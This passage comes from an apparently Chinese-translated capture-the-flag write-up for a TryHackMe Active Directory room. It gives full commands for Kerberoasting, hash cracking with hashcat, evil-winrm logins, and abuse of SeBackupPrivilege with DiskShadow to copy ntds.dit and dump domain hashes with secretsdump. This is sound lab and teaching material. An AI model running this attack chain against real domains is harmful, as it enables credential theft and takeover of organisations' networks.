ir"> <em class="kt"> GetUserSPNs.py </em> </strong>”工具获得SPN的TGS票。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="7f57" class="mn lc iq mj b gy mo mp l mq mr">sudo python3 GetUserSPNs.py -dc-ip 10.10.32.193 raz0rblack.thm/lvetrova -hashes f220d3988deb3******:f220d3988deb3***** -request</span></pre><p id="a78e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这成功地为用户“<strong class="jw ir"> <em class="kt"> xyan1d3 </em> </strong>”提供了一个TGS散列，现在我可以使用<strong class="jw ir"> hashcat </strong>来获取密码。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="66c2" class="mn lc iq mj b gy mo mp l mq mr">hashcat64.exe -m 13100 hash.txt rockyou.txt</span></pre><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi ns"><img src="../Images/1bf12e7e4d04ef6933977af980237799.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pdPBdexJ0B_BHc4GnoX-fw.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">破解哈希。</figcaption></figure><p id="2430" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我使用带有<strong class="jw ir"> evil-winrm </strong>的凭证登录。登录后，我发现了另一个PSCredential PowerShell xml文件，其中包含该标志，尽管声明不是这样。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nt"><img src="../Images/89c2c373a804c3ec3ac9918d6506abd4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zkHcgBZtjFcad8Acf6TYqQ.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">Xyan1d3的标志。</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="d60c" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">权限提升</h1><p id="dc99" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我首先使用<strong class="jw ir"> whoami </strong>执行一些手动用户枚举。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="fbc1" class="mn lc iq mj b gy mo mp l mq mr">whoami /all</span><span id="9b34" class="mn lc iq mj b gy ms mp l mq mr">Group Name                                 Type<br/>========================================== ================<br/>Everyone                                   Well-known group<br/><strong class="mj ir">BUILTIN\Backup Operators</strong>                   Alias<br/>BUILTIN\Remote Management Users            Alias<br/>BUILTIN\Users                              Alias<br/>......<br/></span><span id="97dc" class="mn lc iq mj b gy ms mp l mq mr">PRIVILEGES INFORMATION<br/>----------------------</span><span id="fab6" class="mn lc iq mj b gy ms mp l mq mr">Privilege Name                Description<br/>============================= ==============================<br/>SeMachineAccountPrivilege     Add workstations to domain<br/><strong class="mj ir">SeBackupPrivilege             Back up files and directories</strong><br/><strong class="mj ir">SeRestorePrivilege            Restore files and directories</strong><br/>SeShutdownPrivilege           Shut down the system<br/>SeChangeNotifyPrivilege       Bypass traverse checking<br/>SeIncreaseWorkingSetPrivilege Increase a process working set</span></pre><p id="b9a9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">通过使用<strong class="jw ir"><em class="kt">“whoami/all”、</em> </strong>查看用户的权限，我看到该用户属于<strong class="jw ir">备份操作员</strong>组，该组启用了<strong class="jw ir"> SeBackupPrivilege </strong>和<strong class="jw ir"> SeRestorePrivilege </strong>。这可以通过多种技术来利用，比如使用<a class="ae ks" href="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960" rel="noopener"> DiskShadow </a>。下面是用来获取文件的脚本。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="c46c" class="mn lc iq mj b gy mo mp l mq mr">set metadata C:\tmp\tmp.cabs <br/>set context persistent nowriters <br/>add volume c: alias someAlias <br/>create <br/>expose %someAlias% h:</span></pre><p id="1a61" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我上传了文本文件并执行了下面的命令，如上面链接的文章所述。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="7671" class="mn lc iq mj b gy mo mp l mq mr">*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; upload back_script.txt</span><span id="b36c" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; mkdir C:\tmp</span><span id="725f" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; diskshadow /s back_script.txt</span><span id="74fc" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\tmp&gt; upload SeBackupPrivilegeUtils.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; upload SeBackupPrivilegeCmdLets.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; import-module .\SeBackupPrivilegeUtils.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; import-module .\SeBackupPrivilegeCmdLets.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite</span><span id="04b0" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\temp&gt; reg save hklm\system c:\temp\system</span><span id="3e60" class="mn lc iq mj b gy ms mp l mq mr">*Evil-WinRM* PS C:\temp&gt; download ntds.dit<br/>*Evil-WinRM* PS C:\temp&gt; download system</span></pre><p id="6b68" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">一旦我有了<strong class="jw ir"> ntds.dit </strong>和<strong class="jw ir">系统</strong>文件，我就可以使用“<strong class="jw ir"><em class="kt">secrets dump . py</em></strong>”来检索散列。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="7dc6" class="mn lc iq mj b gy mo mp l mq mr">python3 secretsdump.py -system system -ntds ntds.dit LOCAL</span></pre><p id="7a02" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这为管理员的帐户提供了散列。我现在可以使用<strong class="jw ir"> evil-winrm </strong>作为管理员登录。我可以看到带有标志的PS credential PowerShell "<strong class="jw ir"><em class="kt">root . XML</em></strong>"文件，但在尝试读取该文件时出现错误。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nu"><img src="../Images/34c8b05318bd79e8186d5bad10d1d90b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UfvbEPMEu5FaQsdRm02oPA.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">PSCredential PowerShell错误。</figcaption></figure><p id="b4c5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">查看“<strong class="jw ir"> <em class="kt"> root.xml </em> </strong>”的内容，我可以看到编码的标志。使用CyberChef，我可以看到该文件的标志是十六进制编码，解码它给我的标志。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/adcc1a4e04fdeb74229156033f2c1a14.png" data-original-src="https://miro.medium.com/v2/resize:fit:1050/format:webp/1*IAnLx9XVpgV6utcswRmqLg.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">根标志。</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="ead7" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">泰森的旗帜</h1><p id="40fe" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我开始找泰森的旗帜，找到了一个名为“<strong class="jw ir"> <em class="kt"> twilliams </em> </strong>”的用户文件夹。在文件夹里，我发现了一个可疑的文件:</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="3b5c" class="mn lc iq mj b gy mo mp l mq mr">definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe</span></pre><p id="aefd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">检查这个文件的内容给了我一个标志。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nw"><img src="../Images/a5bbf114ff16fa355a58949d9f046a53.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J88gqN6xbsNQecWj5PsZgw.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">泰森旗帜。</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="c5ef" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">绝对机密的</h1><p id="b0a0" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">这个房间的最终任务是找到藏在机器上的最高机密。执行一些手动枚举，我在“<strong class="jw ir"><em class="kt"/></strong>”程序文件下找到一个名为“<strong class="jw ir"> <em class="kt">绝密</em> </strong>的文件夹。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="afc1" class="mn lc iq mj b gy mo mp l mq mr">Mode                LastWriteTime         Length Name<br/>----                -------------         ------ ----<br/>d-----        5/21/2021  11:45 AM                Amazon<br/>d-----        2/23/2021   6:27 AM                Common Files<br/>d-----        5/21/2021   9:39 AM                internet explorer<br/><strong class="mj ir">d-----        2/25/2021  10:13 AM                Top Secret</strong><br/>d-----        5/21/2021  11:41 AM                VMware</span></pre><p id="95ff" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到一个图像文件存储在名为“<strong class="jw ir"> <em class="kt"> top_secret.png </em> </strong>”的文件夹中。我下载了图像并打开了它。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/be0ff2e16ae39895a81307b408598b52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*Y6MiyXudrPNAn7fi44peZw.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">绝密. png</figcaption></figure><p id="c78f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">根据图像，似乎最高机密是用于退出VIM的完整命令。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="8020" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最后的想法</h1><p id="f369" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我真的很喜欢在这个房间里工作，并有机会学习更多关于利用Active Directory域控制器的知识。这个挑战有很多枚举，这帮助我提高了我的Active Directory枚举技能。谢谢你一直读到最后，继续黑下去😄！</p></div></div>    
</body>
</html>